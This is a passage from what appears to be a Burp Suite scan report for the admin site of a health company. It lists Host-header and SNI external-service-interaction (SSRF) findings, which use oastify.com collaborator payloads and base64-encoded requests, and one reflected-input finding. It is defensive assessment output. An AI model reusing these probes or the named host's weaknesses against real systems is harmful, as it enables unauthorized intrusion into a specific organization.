    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/bootstrap.bundle.min.js]]></path>
    <location><![CDATA[/js/bootstrap.bundle.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>kuiz0ll0ghnv8fhsdz9syryuplvfjed261urhh56.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGt1aXowbGwwZ2hudjhmaHNkejlzeXJ5dXBsdmZqZWQyNjF1cmhoNTYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 01:02:23.722 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGt1aXowbGwwZ2hudjhmaHNkejlzeXJ5dXBsdmZqZWQyNjF1cmhoNTYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncm1nbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>4522683472676018176</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/chart-4.js]]></path>
    <location><![CDATA[/js/chart-4.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>6u1l07lmg3nh81hedl9eydygp7v1jxjlck0an0bp.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDZ1MWwwN2xtZzNuaDgxaGVkbDlleWR5Z3A3djFqeGpsY2swYW4wYnAub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:49:14.590 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>6u1l07lmg3nh81hedl9eydygp7v1jxjlck0an0bp.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5643215896272148480</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/chart-4.js]]></path>
    <location><![CDATA[/js/chart-4.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>6u1l07lmg3nh81hedl9eydygp7v1jxjlck0an0bp.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDZ1MWwwN2xtZzNuaDgxaGVkbDlleWR5Z3A3djFqeGpsY2swYW4wYnAub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:49:15.516 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDZ1MWwwN2xtZzNuaDgxaGVkbDlleWR5Z3A3djFqeGpsY2swYW4wYnAub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nb3NnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1577687690394847232</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/chartjs/chart.js]]></path>
    <location><![CDATA[/js/chartjs/chart.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>m9w1fn02vj2xnhwus1oudtdw4nahye32w1kr7hv6.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG05dzFmbjAydmoyeG5od3VzMW91ZHRkdzRuYWh5ZTMydzFrcjdodjYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.84.197</originIp>
      <time>2024-Dec-15 00:56:16.993 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>m9w1fn02vj2xnhwus1oudtdw4nahye32w1kr7hv6.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7717883742263211008</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/chartjs/chart.js]]></path>
    <location><![CDATA[/js/chartjs/chart.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>m9w1fn02vj2xnhwus1oudtdw4nahye32w1kr7hv6.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG05dzFmbjAydmoyeG5od3VzMW91ZHRkdzRuYWh5ZTMydzFrcjdodjYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:56:17.541 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG05dzFmbjAydmoyeG5od3VzMW91ZHRkdzRuYWh5ZTMydzFrcjdodjYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncHhnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1633587320516794368</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/buttons.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/buttons.bootstrap4.min.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzLzg2bGJpcWF5dDcgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6472285679299766272</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/buttons.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/buttons.bootstrap4.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>7owmu8fna4hi22bf7m3fseshj8p2d04oxnld83ws.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdvd211OGZuYTRoaTIyYmY3bTNmc2VzaGo4cDJkMDRveG5sZDgzd3Mub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>178.128.64.126</originIp>
      <time>2024-Dec-15 00:56:49.343 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>7owmu8fna4hi22bf7m3fseshj8p2d04oxnld83ws.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7235581698597128192</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/buttons.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/buttons.bootstrap4.min.js]]></location>
    <severity>High</severity>
